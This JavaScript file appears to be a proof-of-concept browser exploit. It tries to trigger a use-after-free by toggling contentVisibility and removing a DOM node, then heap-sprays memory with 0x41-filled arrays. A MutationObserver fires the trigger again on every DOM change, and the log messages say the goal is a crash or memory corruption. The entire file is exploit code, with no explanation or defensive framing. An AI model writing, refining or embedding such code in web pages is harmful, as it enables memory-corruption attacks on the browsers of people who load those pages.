import { debug_log } from './module/utils.mjs';

const container = document.querySelector(".container");
const child = document.querySelector(".child");

function heapSpray() {
  let spray = [];
  for (let i = 0; i < 10000; i++) {
    let arr = new Uint8Array(0x1000);
    for (let j = 0; j < arr.length; j++) {
      arr[j] = 0x41;
    }
    spray.push(arr);
  }
  return spray;
}

export function triggerUAF() {
  container.style.contentVisibility = "hidden";
  child.remove();
  setTimeout(() => {
    container.style.contentVisibility = "auto";
    let spray = heapSpray();
    debug_log("UAF triggered, check for crash or memory corruption.");
  }, 0);
}

const observer = new MutationObserver(() => {
  debug_log("DOM tree modified, attempting UAF...");
  triggerUAF();
});

observer.observe(container, { childList: true, subtree: true });